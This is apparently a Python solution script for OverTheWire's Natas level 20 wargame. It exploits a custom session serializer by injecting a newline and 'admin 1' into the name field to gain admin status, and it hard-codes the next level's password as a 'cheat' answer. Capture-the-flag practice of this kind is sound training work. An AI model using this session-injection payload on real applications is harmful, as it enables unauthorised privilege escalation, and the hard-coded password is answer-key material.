import requests

import natas19
from helpers import between


def solution(password: str = None, cheat: bool = False) -> str:
    if cheat:
        return "IFekPyrQXftziDEsUr3x21sYuahypdgJ"
    url = "http://natas20.natas.labs.overthewire.org"
    username = "natas20"
    if not password:
        password = natas19.solution()

    # The source code shows that the app is using a custom
    # serialization method that writes key value pairs separated by
    # the space character to $_SESSION, and each pair is on a new line.
    # Getting the password requires $_SESSION["admin"] == 1

    s = requests.Session()
    auth = (username, password)
    data = {"name": "natas20\nadmin 1"}
    s.post(url, auth=auth, data=data)
    r = s.get(url, auth=auth)
    start = "Password: "
    end = "</pre>"
    natas21_password = between(r.text, start, end)
    return natas21_password
